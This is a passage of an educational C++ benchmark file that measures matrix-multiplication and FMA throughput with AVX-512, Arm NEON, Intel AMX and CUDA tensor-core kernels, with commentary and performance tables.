    __m512 b_vec_3 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    c_vec = _mm512_fmadd_ps(a_vec_3, b_vec_3, c_vec);

    __m512 a_vec_4 = _mm512_permute_ps(a_mat, 0xFF);
    b_mat = _mm512_castsi512_ps(_mm512_alignr_epi64(_mm512_castps_si512(b_mat), _mm512_castps_si512(b_mat), 0x2));
    __m512 b_vec_4 = _mm512_broadcast_f32x4(_mm512_castps512_ps128(b_mat));
    c_vec = _mm512_fmadd_ps(a_vec_4, b_vec_4, c_vec);

    f32x4x4_t c;
    _mm512_storeu_ps(&c.scalars[0][0], c_vec);
    return c;
}

#if defined(__GNUC__) && !defined(__clang__)
#pragma GCC pop_options
#elif defined(__clang__)
#pragma clang attribute pop
#endif

static void f32x4x4_matmul_avx512(bm::State &state) {
    f32x4x4_t a, b, c;
    std::iota(&a.scalars[0][0], &a.scalars[0][0] + 16, 16);
    std::iota(&b.scalars[0][0], &b.scalars[0][0] + 16, 0);

    for (auto _ : state) bm::DoNotOptimize(c = f32x4x4_matmul_avx512_kernel(a, b));

    std::size_t tops_per_cycle = 4 * 4 * (4 /* multiplications */ + 3 /* additions */);
    state.counters["TOP"] = bm::Counter(state.iterations() * tops_per_cycle, bm::Counter::kIsRate);
}
BENCHMARK(f32x4x4_matmul_avx512);

#endif // defined(__AVX512F__)

/**
 *  The result is @b 2.8ns on Sapphire Rapids—a modest 10% improvement. To
 *  fully leverage AVX-512, we need larger matrices where horizontal reductions
 *  don't dominate latency. For small sizes like 4x4, the wide ZMM registers
 *  aren't fully utilized.
 *
 *  As an exercise, try implementing matrix multiplication for 3x3 matrices.
 *  Despite requiring fewer operations (27 multiplications and 18 additions
 *  compared to 64 multiplications and 48 additions for 4x4), the compiler
 *  may peak at @b 5.3ns — whopping @b 71% slower for a @b 60% smaller task!
 *
 *  AVX-512 includes advanced instructions like `_mm512_mask_compressstoreu_ps`
 *  and `_mm512_maskz_expandloadu_ps`, which could be used with a mask like
 *  @b 0b0000'0111'0111'0111 to handle 3x3 matrices. However, their high latency
 *  means the performance will still degrade—@b around 5ns in practice.
 *
 *  Benchmark everything! Don't assume less work translates to faster execution.
 *  Read the specs of your hardware to understand it's theoretical upper limits,
 *  and double-check them with stress-tests. Pure @b Assembly is perfect for this!
 *
 *  Let's implement a few simple Assembly kernels for Fused-Multiply-Add @b (FMA)
 *  operations, assuming the data is already in our registers and aligned and
 *  represents a small slice of a very large matrix. That way we can infer the
 *  theoretical upper bounds for matrix multiplication throughput on our CPU.
 */

typedef std::uint32_t (*theoretic_tops_kernel_t)(void);
typedef void (*theoretic_tops_prepare_t)(void);

static void theoretic_tops(                        //
    bm::State &state,                              //
    theoretic_tops_kernel_t theoretic_tops_kernel, //
    theoretic_tops_prepare_t prepare = nullptr) {

    // If there is some preparation to be done, do it.
    if (prepare) try {
            prepare();
        }
        catch (std::exception const &e) {
            state.SkipWithError(e.what());
            return;
        }

    // Each kernel returns the number of TOPS.
    std::size_t tops = 0;
    for (auto _ : state) bm::DoNotOptimize(tops = theoretic_tops_kernel());
    state.counters["TOP"] = bm::Counter(tops * state.iterations() * state.threads() * 1.0, bm::Counter::kIsRate);
}

#if defined(__AVX512F__) || defined(__AVX2__)
void configure_x86_denormals(void) {
    _MM_SET_FLUSH_ZERO_MODE(_MM_FLUSH_ZERO_ON);         // Flush results to zero
    _MM_SET_DENORMALS_ZERO_MODE(_MM_DENORMALS_ZERO_ON); // Treat denormal inputs as zero
}
#endif

/**
 *  Assuming we are not aiming for dynamic dispatch, we can simply check for
 *  the available features at compile time with more preprocessing directives:
 *
 *  To list all available macros for x86, take a recent compiler, like GCC, and run:
 *       gcc -march=sapphirerapids -dM -E - < /dev/null | egrep "SSE|AVX" | sort
 *  On Arm machines you may want to check for other flags:
 *       gcc -march=native -dM -E - < /dev/null | egrep "NEON|SVE|FP16|FMA" | sort
 *
 *  @see Arm Feature Detection: https://developer.arm.com/documentation/101028/0010/Feature-test-macros
 */
#if !defined(_MSC_VER)
#if defined(__AVX512F__)
extern "C" std::uint32_t tops_f64_avx512ma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx512ma, tops_f64_avx512ma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx512ma, tops_f64_avx512ma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_f64_avx512fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx512fma, tops_f64_avx512fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx512fma, tops_f64_avx512fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());

extern "C" std::uint32_t tops_f32_avx512ma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx512ma, tops_f32_avx512ma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx512ma, tops_f32_avx512ma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_f32_avx512fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx512fma, tops_f32_avx512fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx512fma, tops_f32_avx512fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
#endif // defined(__AVX512F__)

#if defined(__AVX512FP16__)
extern "C" std::uint32_t tops_f16_avx512ma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f16_avx512ma, tops_f16_avx512ma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f16_avx512ma, tops_f16_avx512ma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_f16_avx512fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f16_avx512fma, tops_f16_avx512fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f16_avx512fma, tops_f16_avx512fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
#endif // defined(__AVX512FP16__)

#if defined(__AVX512BF16__)
extern "C" std::uint32_t tops_bf16_avx512fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, bf16_avx512fma, tops_bf16_avx512fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, bf16_avx512fma, tops_bf16_avx512fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
#endif // defined(__AVX512BF16__)

#if defined(__AVX512VNNI__)
extern "C" std::uint32_t tops_i16_avx512fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, i16_avx512fma, tops_i16_avx512fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, i16_avx512fma, tops_i16_avx512fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_i7_avx512fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, i7_avx512fma, tops_i7_avx512fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, i7_avx512fma, tops_i7_avx512fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
#endif // defined(__AVX512VNNI__)

#if defined(__AVX2__)
extern "C" std::uint32_t tops_f64_avx2ma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx2ma, tops_f64_avx2ma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx2ma, tops_f64_avx2ma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_f64_avx2fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx2fma, tops_f64_avx2fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f64_avx2fma, tops_f64_avx2fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_f32_avx2ma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx2ma, tops_f32_avx2ma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx2ma, tops_f32_avx2ma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_f32_avx2fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx2fma, tops_f32_avx2fma_asm_kernel, configure_x86_denormals)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f32_avx2fma, tops_f32_avx2fma_asm_kernel, configure_x86_denormals)
    ->MinTime(10)
    ->Threads(physical_cores());
#endif // defined(__AVX2__)

#if defined(__ARM_NEON)
extern "C" std::uint32_t tops_f64_neon_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f64_neon, tops_f64_neon_asm_kernel)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f64_neon, tops_f64_neon_asm_kernel)->MinTime(10)->Threads(physical_cores());
extern "C" std::uint32_t tops_f32_neon_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f32_neon, tops_f32_neon_asm_kernel)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f32_neon, tops_f32_neon_asm_kernel)->MinTime(10)->Threads(physical_cores());
#endif // defined(__ARM_NEON)

#if defined(__ARM_FEATURE_FP16_VECTOR_ARITHMETIC)
extern "C" std::uint32_t tops_f16_neon_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, f16_neon, tops_f16_neon_asm_kernel)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, f16_neon, tops_f16_neon_asm_kernel)->MinTime(10)->Threads(physical_cores());
#endif // defined(__ARM_FEATURE_FP16_VECTOR_ARITHMETIC)

#if defined(__ARM_FEATURE_BF16_VECTOR_ARITHMETIC)
extern "C" std::uint32_t tops_bf16_neon_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, bf16_neon, tops_bf16_neon_asm_kernel)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, bf16_neon, tops_bf16_neon_asm_kernel)->MinTime(10)->Threads(physical_cores());
#endif // defined(__ARM_FEATURE_BF16_VECTOR_ARITHMETIC)

#if defined(__ARM_FEATURE_DOTPROD)
extern "C" std::uint32_t tops_i8_neon_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, i8_neon, tops_i8_neon_asm_kernel)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, i8_neon, tops_i8_neon_asm_kernel)->MinTime(10)->Threads(physical_cores());
extern "C" std::uint32_t tops_u8_neon_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, u8_neon, tops_u8_neon_asm_kernel)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, u8_neon, tops_u8_neon_asm_kernel)->MinTime(10)->Threads(physical_cores());
#endif // defined(__ARM_FEATURE_DOTPROD)
#endif // !defined(_MSC_VER)

#if defined(__AMX_TILE__)
/**
 *  Most modern chip vendors introduce specialized instructions for matrix
 *  multiplications! On Intel (unlike AMD), they are called Advanced Matrix
 *  Extensions @b (AMX).
 *
 *  There are 8 specialized @b TMM registers, most compilers don't even have
 *  working intrinsics for them, but even writing Assembly is not enough to
 *  use them - you need to instruct the Linux kernel to enable them.
 */

bool enable_amx() {
    constexpr int _SYS_arch_prctl = 158;
    constexpr int ARCH_REQ_XCOMP_PERM = 0x1023;
    constexpr int ARCH_GET_XCOMP_PERM = 0x1022;
    constexpr int XFEATURE_XTILEDATA = 18;
    constexpr int XFEATURE_XTILECFG = 17;
    constexpr unsigned long XFEATURE_MASK_XTILE = (1UL << XFEATURE_XTILECFG) | (1UL << XFEATURE_XTILEDATA);
    unsigned long bitmask = 0;

    // Request `XTILEDATA` permission
    if (syscall(_SYS_arch_prctl, ARCH_REQ_XCOMP_PERM, XFEATURE_XTILEDATA) != 0) return false;
    // Validate `XTILEDATA` and `XTILECFG` permissions
    if (syscall(_SYS_arch_prctl, ARCH_GET_XCOMP_PERM, &bitmask) != 0) return false;
    return (bitmask & XFEATURE_MASK_XTILE) != 0;
}

void configure_amx() {
    if (!enable_amx()) throw std::runtime_error("AMX not enabled!");

    // Using Intel AMX instructions we can perform 16x32x16 brain-float
    // multiplication using specialized matrix-multiplication hardware,
    // accumulating the results in a 16x16 single-precision matrix.
    // Alternatively we can perform 16x64x16 `int8` multiplications.
    alignas(64) char tiles_config[64];

    // Memset in one cycle, like a boss :)
    // As opposed to: `std::memset(tiles_config, 0, sizeof(tiles_config))`.
    _mm512_storeu_si512((__m512i *)tiles_config, _mm512_setzero_si512());

    // Only one palette is currently supported:
    std::uint8_t *palette_id_ptr = (std::uint8_t *)(&tiles_config[0]);
    *palette_id_ptr = 1;

    // The geniuses behind AMX decided to use different precisions for
    // the rows and columns. Wasted 2 hours of my life not noticing this!
    std::uint16_t *tiles_colsb_ptr = (std::uint16_t *)(&tiles_config[16]);
    std::uint8_t *tiles_rows_ptr = (std::uint8_t *)(&tiles_config[48]);

    // Important to note, AMX doesn't care about the real shape of our matrix,
    // it only cares about it's own tile shape. Keep it simple, otherwise
    // the next person reading this will be painting the walls with their brains :)
    tiles_rows_ptr[0] = tiles_rows_ptr[1] = tiles_rows_ptr[2] = tiles_rows_ptr[3] = 16;
    tiles_colsb_ptr[0] = tiles_colsb_ptr[1] = tiles_colsb_ptr[2] = tiles_colsb_ptr[3] = 64;
    // If you forget to set any one of those, you'll see an "Illegal Instruction"!
    tiles_rows_ptr[4] = tiles_rows_ptr[5] = tiles_rows_ptr[6] = tiles_rows_ptr[7] = 16;
    tiles_colsb_ptr[4] = tiles_colsb_ptr[5] = tiles_colsb_ptr[6] = tiles_colsb_ptr[7] = 64;

    // We will use 4 registers for inputs, and 4 registers for outputs
    _tile_loadconfig(&tiles_config);
    _tile_zero(4);
    _tile_zero(5);
    _tile_zero(6);
    _tile_zero(7);
}

#if defined(__AMX_BF16__)
extern "C" std::uint32_t tops_bf16_amx_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, bf16_amx, tops_bf16_amx_asm_kernel, configure_amx)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, bf16_amx, tops_bf16_amx_asm_kernel, configure_amx)
    ->MinTime(10)
    ->Threads(physical_cores());
#endif // defined(__AMX_BF16__)

#if defined(__AMX_INT8__)
extern "C" std::uint32_t tops_u8_amx_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, u8_amx, tops_u8_amx_asm_kernel, configure_amx)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, u8_amx, tops_u8_amx_asm_kernel, configure_amx)
    ->MinTime(10)
    ->Threads(physical_cores());
extern "C" std::uint32_t tops_i8_amx_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, i8_amx, tops_i8_amx_asm_kernel, configure_amx)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, i8_amx, tops_i8_amx_asm_kernel, configure_amx)
    ->MinTime(10)
    ->Threads(physical_cores());
#endif // defined(__AMX_INT8__)

#endif // defined(__AMX_TILE__)

/**
 *  For starters, Nvidia H100, the most common GPU in current HPC workloads,
 *  claims the following numbers for its scalar operations and tensor cores:
 *
 *                  Scalar Operations       Tensor Operations
 *
 *  - `f64`:        @b 34 T                 @b 67 T
 *  - `f32`:        @b 67 T                 @b 989 T
 *  - `bf16`:                               @b 1.9 P
 *  - `f16`:                                @b 2.9 P
 *  - `i8`:                                 @b 3.9 P
 *
 *  This requires up to 700 W of power. A typical high-end server CPU uses
 *  under 500 W of power, and has similar number of cores to the GPUs number
 *  of Streaming Multiprocessors @b (SMs). The CPU can also run at a higher
 *  frequency, and has a larger cache, which is crucial for many workloads.
 *  On a single CPU core, we can achieve the following FMA throughput:
 *
 *                              Intel Xeon 4     AMD Zen 4        Graviton 4
 *    @b FMA in AVX-512 & NEON:
 *    - `f64`:                  @b 1.2-76 G ¹    @b 58 G          @b 31 G
 *    - `f32`:                  @b 3.1-135 G ¹   @b 117 G         @b 63 G
 *    - `bf16`:                 @b 121 G         @b 235 G         @b 101 G
 *    - `f16`:                  @b 286 G 🤯🤯     -                @b 116 G
 *    - `i16`:                  @b 342 G 🤯🤯     -                -
 *    - `i7`: ²                 @b 678 G         @b 470 G 🤯🤯     -
 *    - `i8`, `u8`:             -                -                @b 1.1 T
 *    @b Mat-Mul in AMX & SME:
 *    - `bf16`:                 @b 3.6 T         -                -
 *    - `i8`, `u8`:             @b 7.2 T 🤯🤯🤯   -                -
 *
 *  On a high-end dual-socket system, comparing `c7i.metal-48xl` to `c7a.metal-48xl`
 *  and `c8g.metal-48xl` 192-core instances on AWS, this scales to:
 *
 *                              Intel Xeon 4     AMD Zen 4        Graviton 4
 *    @b FMA in AVX-512 & NEON:
 *    - `f64`:                  @b 0.2-8.2 T ¹   @b 9.3 T         @b 4.2 T
 *    - `f32`:                  @b 0.6-15.1 T ¹  @b 20.1 T        @b 8.4 T
 *    - `bf16`:                 @b 9.8 T         @b 41.8 T        @b 20.1 T
 *    - `f16`:                  @b 35.4 T        -                @b 16.8 T
 *    - `i16`:                  @b 34.3 T        -                -
 *    - `i7`:                   @b 76 T          @b 81.3 T        -
 *    - `i8`, `u8`:             -                -                @b 38.2 T
 *    @b Mat-Mul in AMX & SME:
 *    - `bf16`:                 @b 301 T         -                -
 *    - `i8`, `u8`:             @b 683 T 🤯🤯🤯   -                -
 *
 *  > ¹ The FMA throughput on Intel can be insanely low for denormal numbers!
 *  > ² AVX-512 has weird `i8` by `u8` multiplication instructions, which don't
 *      seem useful for any 8-bit problems I've encountered, but are handy for
 *      7-bit representations.
 *
 *  The Fused-Multiply-Add performance should be higher than separate Multiply
 *  and Add operations. Moreover, there is no direct support for `bf16` math
 *  in x86, so for some numeric types FMA is the only option.
 */

#pragma endregion // Compute Bound Linear Algebra

#pragma region // Port Interleaving and Latency Hiding

/**
 *  You may have noticed, that we sometimes have multiple pieces of silicon
 *  with same functionality. If we know that different instructions are
 *  executed on different ports (or execution units), we can interleave them
 *  saturating the CPU even further!
 */

#if defined(__AVX512VNNI__) && defined(__AMX_INT8__)

extern "C" std::uint32_t tops_i7_amx_avx512fma_asm_kernel(void);
BENCHMARK_CAPTURE(theoretic_tops, i7_amx_avx512, tops_i7_amx_avx512fma_asm_kernel, configure_amx)->MinTime(10);
BENCHMARK_CAPTURE(theoretic_tops, i7_amx_avx512, tops_i7_amx_avx512fma_asm_kernel, configure_amx)
    ->MinTime(10)
    ->Threads(physical_cores());

#endif // defined(__AVX512VNNI__) && defined(__AMX_INT8__)

/**
 *  Combining "AMX_INT8" and "AVX512_VNNI" instructions, we can grow
 *  from 7.5 Tera-OPS and 708 Giga-OPS to @b 7.8 Tera-OPS. Granted, its not
 *  a life-altering improvement, but in other applications it could be!
 *
 *  A great can be CRC32 hashing, combining dedicated `CRC32` and `VPCLMULQDQ`
 *  instructions to achieve 31 GB/s throughput, hiding the latency of some
 *  instructions while others execute on a different port.
 *
 *  - `CRC32 (R64, R64)`: 3 cycle latency on port 1 on Intel Ice Lake.
 *  - `VPCLMULQDQ (ZMM, ZMM, ZMM, I8)`: 8 cycle latency, which starts execution
 *    on ports 0 or 5 and retires from port 5 on the same CPU.
 *
 *  @see "Faster CRC32-C on x86" by Peter Cawley:
 *       https://www.corsix.org/content/fast-crc32c-4k
 *       https://github.com/corsix/fast-crc32
 */

#pragma endregion // Port Interleaving and Latency Hiding

#pragma region GPGPU Programming

#if _LESS_SLOW_WITH_CUDA
#include <cuda.h>

/**
 *  Different generations of matrix multiplication instructions on GPUs use
 *  different synchronization/cooperation scales across generations.
 */
enum class tensor_core_scale_t : int {
    unknown_k = 0,

    /**
     *  Before Volta, individual CUDA cores would compute matrix multiplication
     *  as many individual scalar FMA operations over tiles in shared cache.
     *  Applies to SM levels @b <7.0.
     */
    single_k = 1,
    /**
     *  On Volta and newer, 8 consecutive threads compute the MMA together.
     *  Applies to SM level @b ≥7.0.
     */
    quadpair_k = 8,
    /**
     *  On Ampere and newer, 32 consecutive threads in a single warp compute
     *  WMMA together. Applies to SM level @b ≥8.0.
     */
    warp_k = 32,
    /**
     *  On Hopper and newer, 128 consecutive threads in 4 consecutive warps
     *  compute larger Warp Group MMA together. Applies to SM level @b ≥9.0.
     */
    warpgroup_k = 128,

};

tensor_core_scale_t tensor_core_scale(int sm_capability) {
    if (sm_capability >= 90) return tensor_core_scale_t::warpgroup_k;
    if (sm_capability >= 80) return tensor_core_scale_t::warp_k;
    if (sm_capability >= 70) return tensor_core_scale_t::quadpair_k;
    return tensor_core_scale_t::single_k;
}

/**
 *  @brief Runs the benchmark loop for precompiled CUDA C++ kernels using
 *  the high-level @b runtime API. It counts TOPS (Tensor Operations Per
 *  Second) as the number of scalar multiplications in $A * B$, ignoring
 *  the $D$ additive part of $A * B + D$.
 *
 *  @param m,n,k Dimensions of matrices multiplied by one instruction.
 *  @param required_capability GPU's Streaming Multiprocessor generation needed.
 *  @param scale Number of threads in each block, computing MMA collectively.
 */
static void theoretic_tops_cuda(                   //
    bm::State &state, __global__ void (*kernel)(), //
    std::size_t m, std::size_t n, std::size_t k,   //
    int required_capability,                       //
    std::size_t repetitions,                       //
    tensor_core_scale_t scale = tensor_core_scale_t::unknown_k) {

    cudaDeviceProp properties;
    cudaGetDeviceProperties(&properties, 0);
    int const blocks = properties.multiProcessorCount;
    // On Hopper and newer, 4 warps need to synchronize WGMMAs.
    int const threads_per_block = properties.warpSize * 4;
    if (scale == tensor_core_scale_t::unknown_k) scale = tensor_core_scale(required_capability);

    for (auto _ : state) {
        // A typical CUDA kernel invocation would look like this:
        //
        //      kernel<<<blocks, threads_per_block>>>();
        //
        // However, that syntactic sugar will break compilation, unless we use
        // NVCC. Instead we can use the CUDA API directly:
        void *kernel_args = nullptr;
        cudaError_t error = cudaLaunchKernel( //
            kernel,                           // kernel function pointer
            dim3(blocks),                     // grid dimensions
            dim3(threads_per_block),          // block dimensions
            &kernel_args,                     // kernel arguments
            0,                                // shared memory size
            0);                               // default stream
        if (error != cudaSuccess) state.SkipWithError("CUDA error after kernel launch: "s + cudaGetErrorString(error));
        cudaDeviceSynchronize();
    }

    std::size_t const threads = static_cast<std::size_t>(blocks * threads_per_block);
    std::size_t const tops_per_cycle = m * n * k * 2 * repetitions;
    std::size_t const tops_per_gpu = tops_per_cycle * threads / static_cast<std::size_t>(scale);
    state.counters["TOP"] = benchmark::Counter(tops_per_gpu * state.iterations(), benchmark::Counter::kIsRate);
}

extern __global__ void tops_f32f32_sm60fma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_f64f64_sm60fma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_i32i32_sm60fma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_i64i64_sm60fma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_u8u32_sm60fma_16x16x64_loop128_cuda_kernel();
extern __global__ void tops_u24u32_sm60fma_16x16x16_loop128_cuda_kernel();

BENCHMARK_CAPTURE(                                                                         //
    theoretic_tops_cuda, f32f32_sm60fma, tops_f32f32_sm60fma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 60, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                         //
    theoretic_tops_cuda, f64f64_sm60fma, tops_f64f64_sm60fma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 60, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                         //
    theoretic_tops_cuda, i32i32_sm60fma, tops_i32i32_sm60fma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 60, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                         //
    theoretic_tops_cuda, i64i64_sm60fma, tops_i64i64_sm60fma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 60, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                       //
    theoretic_tops_cuda, u8u32_sm60fma, tops_u8u32_sm60fma_16x16x64_loop128_cuda_kernel, //
    16, 16, 64, 60, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                         //
    theoretic_tops_cuda, u24u32_sm60fma, tops_u24u32_sm60fma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 60, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);

extern __global__ void tops_f16f16_sm70fma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_f16f16_sm70wmma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_f16f32_sm70wmma_16x16x16_loop128_cuda_kernel();

BENCHMARK_CAPTURE(                                                                         //
    theoretic_tops_cuda, f16f16_sm60fma, tops_f16f16_sm70fma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 70, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                           //
    theoretic_tops_cuda, f16f16_sm70wmma, tops_f16f16_sm70wmma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 70, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                           //
    theoretic_tops_cuda, f16f32_sm70wmma, tops_f16f32_sm70wmma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 70, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);

extern __global__ void tops_u8i32_sm75wmma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_u4i32_sm75wmma_8x8x32_loop128_cuda_kernel();
extern __global__ void tops_b1i32xor_sm75wmma_8x8x128_loop128_cuda_kernel();

BENCHMARK_CAPTURE(                                                                         //
    theoretic_tops_cuda, u8i32_sm75wmma, tops_u8i32_sm75wmma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 75, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                       //
    theoretic_tops_cuda, u4i32_sm75wmma, tops_u4i32_sm75wmma_8x8x32_loop128_cuda_kernel, //
    8, 8, 32, 75, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                              //
    theoretic_tops_cuda, b1i32xor_sm75wmma, tops_b1i32xor_sm75wmma_8x8x128_loop128_cuda_kernel, //
    8, 8, 128, 75, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);

extern __global__ void tops_bf16bf16_sm80fma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_bf16f32_sm80wmma_16x16x16_loop128_cuda_kernel();
extern __global__ void tops_tf32f32_sm80wmma_16x16x8_loop128_cuda_kernel();
extern __global__ void tops_f64f64_sm80wmma_8x8x4_loop128_cuda_kernel();
extern __global__ void tops_b1i32and_sm80wmma_8x8x128_loop128_cuda_kernel();

BENCHMARK_CAPTURE(                                                                             //
    theoretic_tops_cuda, bf16bf16_sm60fma, tops_bf16bf16_sm80fma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 75, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                             //
    theoretic_tops_cuda, bf16f32_sm80wmma, tops_bf16f32_sm80wmma_16x16x16_loop128_cuda_kernel, //
    16, 16, 16, 80, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                            //
    theoretic_tops_cuda, tf32f32_sm80wmma, tops_tf32f32_sm80wmma_16x16x8_loop128_cuda_kernel, //
    16, 16, 8, 80, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                        //
    theoretic_tops_cuda, f64f64_sm80wmma, tops_f64f64_sm80wmma_8x8x4_loop128_cuda_kernel, //
    8, 8, 4, 80, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                              //
    theoretic_tops_cuda, b1i32and_sm80wmma, tops_b1i32and_sm80wmma_8x8x128_loop128_cuda_kernel, //
    8, 8, 128, 80, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);

extern __global__ void tops_f16f32_sm90wgmma_64x256x16_loop128_cuda_kernel();
extern __global__ void tops_bf16f32_sm90wgmma_64x256x16_loop128_cuda_kernel();
extern __global__ void tops_tf32f32_sm90wgmma_64x256x8_loop128_cuda_kernel();

BENCHMARK_CAPTURE(                                                                              //
    theoretic_tops_cuda, f16f32_sm90wgmma, tops_f16f32_sm90wgmma_64x256x16_loop128_cuda_kernel, //
    64, 256, 16, 90, 128, tensor_core_scale_t::warpgroup_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                                //
    theoretic_tops_cuda, bf16f32_sm90wgmma, tops_bf16f32_sm90wgmma_64x256x16_loop128_cuda_kernel, //
    64, 256, 16, 90, 128, tensor_core_scale_t::warpgroup_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                               //
    theoretic_tops_cuda, tf32f32_sm90wgmma, tops_tf32f32_sm90wgmma_64x256x8_loop128_cuda_kernel, //
    64, 256, 8, 90, 128, tensor_core_scale_t::warpgroup_k)
